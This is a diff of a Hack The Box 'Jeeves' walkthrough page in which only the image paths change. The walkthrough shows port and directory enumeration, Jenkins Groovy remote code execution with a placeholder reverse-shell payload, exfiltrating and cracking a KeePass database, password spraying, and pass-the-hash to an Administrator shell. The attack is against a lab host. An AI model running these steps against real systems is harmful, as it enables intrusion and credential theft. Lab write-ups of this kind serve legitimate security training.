@@ -49,7 +49,7 @@ Host script results:
 |   challenge_response: supported
 |_  message_signing: disabled (dangerous, but default)
 |_clock-skew: mean: 4h59m24s, deviation: 0s, median: 4h59m24s
-</code></pre><ul><li>Web Server</li></ul><p><img src=./images/1.png></p><ul><li><code>gobuster</code></li></ul><pre tabindex=0><code>└─$ gobuster dir -u http://10.10.10.63/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt --no-error
+</code></pre><ul><li>Web Server</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/jeeves/images/1.png></p><ul><li><code>gobuster</code></li></ul><pre tabindex=0><code>└─$ gobuster dir -u http://10.10.10.63/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt --no-error
 ===============================================================
 Gobuster v3.5
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
@@ -68,7 +68,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 Progress: 441122 / 441122 (100.00%)
 </code></pre><ul><li><code>smb</code></li></ul><pre tabindex=0><code>└─$ smbclient -N -L //10.10.10.63     
 session setup failed: NT_STATUS_ACCESS_DENIED
-</code></pre><ul><li>Port <code>50000</code></li></ul><p><img src=./images/2.png></p><pre tabindex=0><code>└─$ gobuster dir -u http://10.10.10.63:50000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt --no-error
+</code></pre><ul><li>Port <code>50000</code></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/jeeves/images/2.png></p><pre tabindex=0><code>└─$ gobuster dir -u http://10.10.10.63:50000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt --no-error
 ===============================================================
 Gobuster v3.5
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
@@ -85,7 +85,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 2023/09/01 07:38:22 Starting gobuster in directory enumeration mode
 ===============================================================
 /askjeeves            (Status: 302) [Size: 0] [--&gt; http://10.10.10.63:50000/askjeeves/]
-</code></pre><h2 id=foothold--user>Foothold / User</h2><ul><li>http://10.10.10.63:50000/askjeeves/</li></ul><p><img src=./images/3.png></p><ul><li>We can perform one of the techniques specified in this <a href=https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security#rce-in-jenkins target=_blank rel=noopener>post</a><ul><li>I used &lsquo;groovy script` way</li><li><code>println "&lt;powershell bas64-encrypted-payload>".execute()</code><ul><li>Payload from <a href=https://www.revshells.com/ target=_blank rel=noopener>https://www.revshells.com/</a></li></ul></li></ul></li></ul><p><img src=./images/4.png></p><p><img src=./images/5.png></p><h2 id=root>Root</h2><ul><li><code>kohsuke</code> user</li></ul><pre tabindex=0><code>PS C:\Users\kohsuke&gt; whoami /priv
+</code></pre><h2 id=foothold--user>Foothold / User</h2><ul><li>http://10.10.10.63:50000/askjeeves/</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/jeeves/images/3.png></p><ul><li>We can perform one of the techniques specified in this <a href=https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security#rce-in-jenkins target=_blank rel=noopener>post</a><ul><li>I used &lsquo;groovy script` way</li><li><code>println "&lt;powershell bas64-encrypted-payload>".execute()</code><ul><li>Payload from <a href=https://www.revshells.com/ target=_blank rel=noopener>https://www.revshells.com/</a></li></ul></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/jeeves/images/4.png></p><p><img src=/posts/cybersecurity/hackthebox/machines/windows/jeeves/images/5.png></p><h2 id=root>Root</h2><ul><li><code>kohsuke</code> user</li></ul><pre tabindex=0><code>PS C:\Users\kohsuke&gt; whoami /priv
 
 PRIVILEGES INFORMATION
 ----------------------
@@ -125,7 +125,7 @@ Mandatory Label\High Mandatory Level Label            S-1-16-12288
 Mode                LastWriteTime         Length Name                                                                  
 ----                -------------         ------ ----                                                                  
 -a----        9/18/2017   1:43 PM           2846 CEH.kdbx                                                              
-</code></pre><ul><li>Let&rsquo;s download it<ul><li>We can create <code>Freestyle Project</code> in <code>Jenkins</code> and copy files to that project</li></ul></li></ul><p><img src=./images/6.png></p><p><img src=./images/7.png></p><p><img src=./images/8.png></p><pre tabindex=0><code>PS C:\Users\Administrator\.jenkins&gt; ls
+</code></pre><ul><li>Let&rsquo;s download it<ul><li>We can create <code>Freestyle Project</code> in <code>Jenkins</code> and copy files to that project</li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/jeeves/images/6.png></p><p><img src=/posts/cybersecurity/hackthebox/machines/windows/jeeves/images/7.png></p><p><img src=/posts/cybersecurity/hackthebox/machines/windows/jeeves/images/8.png></p><pre tabindex=0><code>PS C:\Users\Administrator\.jenkins&gt; ls
 
 
     Directory: C:\Users\Administrator\.jenkins
@@ -193,7 +193,7 @@ PS C:\Users\Administrator\.jenkins\workspace\pentest&gt; ls
 Mode                LastWriteTime         Length Name                                                                  
 ----                -------------         ------ ----                                                                  
 -a----        9/18/2017   1:43 PM           2846 CEH.kdbx           
-</code></pre><ul><li>Now we can download it from <code>jenkins</code></li></ul><p><img src=./images/9.png></p><ul><li>Let&rsquo;s crack it using <code>john</code><ul><li>First we convert it using <code>keepass2john</code></li><li>Then pass it to <code>john</code><ul><li>Or <code>hashcat</code> if you want</li><li></li></ul></li></ul></li></ul><pre tabindex=0><code>└─$ keepass2john CEH.kdbx &gt; CEH.hash
+</code></pre><ul><li>Now we can download it from <code>jenkins</code></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/jeeves/images/9.png></p><ul><li>Let&rsquo;s crack it using <code>john</code><ul><li>First we convert it using <code>keepass2john</code></li><li>Then pass it to <code>john</code><ul><li>Or <code>hashcat</code> if you want</li><li></li></ul></li></ul></li></ul><pre tabindex=0><code>└─$ keepass2john CEH.kdbx &gt; CEH.hash
 </code></pre><pre tabindex=0><code>└─$ john --wordlist=/usr/share/wordlists/rockyou.txt CEH.hash             
 Using default input encoding: UTF-8
 Loaded 1 password hash (KeePass [SHA256 AES 32/64])
@@ -206,7 +206,7 @@ moonshine1       (CEH)
 1g 0:00:00:38 DONE (2023-09-01 09:23) 0.02623g/s 1442p/s 1442c/s 1442C/s mwuah..moonshine1
 Use the &#34;--show&#34; option to display all of the cracked passwords reliably
 Session completed. 
-</code></pre><ul><li>Let&rsquo;s open it in <code>keepass</code> (or <code>kpcli</code>)<ul><li>We have bunch of passwords</li><li>Let&rsquo;s extract them and pass them to <code>crackmapexec</code></li></ul></li></ul><p><img src=./images/10.png></p><ul><li>But none of them work</li></ul><pre tabindex=0><code>└─$ cat passwords      
+</code></pre><ul><li>Let&rsquo;s open it in <code>keepass</code> (or <code>kpcli</code>)<ul><li>We have bunch of passwords</li><li>Let&rsquo;s extract them and pass them to <code>crackmapexec</code></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/jeeves/images/10.png></p><ul><li>But none of them work</li></ul><pre tabindex=0><code>└─$ cat passwords      
 12345
 S1TjAtJHKsugh9oC4VZl
 pwndyouall!
@@ -221,7 +221,7 @@ SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:pwn
 SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:F7WhTrSFDKB6sxHU1cUn STATUS_LOGON_FAILURE 
 SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:lCEUnYPjNfIuPZSzOySA STATUS_LOGON_FAILURE 
 SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:Password STATUS_LOGON_FAILURE 
-</code></pre><ul><li>The <code>Backup Stuff</code> entry in <code>keepass</code> looks like a <code>lm:ntlm</code> hash<ul><li><code>aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</code></li></ul></li></ul><p><img src=./images/11.png></p><p><img src=./images/12.png></p><ul><li>Let&rsquo;s try <code>crackmapexec</code> with it</li></ul><pre tabindex=0><code>└─$ crackmapexec smb 10.10.10.63 -u Administrator -H &#39;aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00&#39; 
+</code></pre><ul><li>The <code>Backup Stuff</code> entry in <code>keepass</code> looks like a <code>lm:ntlm</code> hash<ul><li><code>aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</code></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/jeeves/images/11.png></p><p><img src=/posts/cybersecurity/hackthebox/machines/windows/jeeves/images/12.png></p><ul><li>Let&rsquo;s try <code>crackmapexec</code> with it</li></ul><pre tabindex=0><code>└─$ crackmapexec smb 10.10.10.63 -u Administrator -H &#39;aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00&#39; 
 SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
 SMB         10.10.10.63     445    JEEVES           [+] Jeeves\Administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)
 </code></pre><ul><li>Get <code>Administrator</code> shell using <code>psexec</code></li></ul><pre tabindex=0><code>└─$ impacket-psexec Administrator@10.10.10.63 -hashes &#39;aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00&#39;
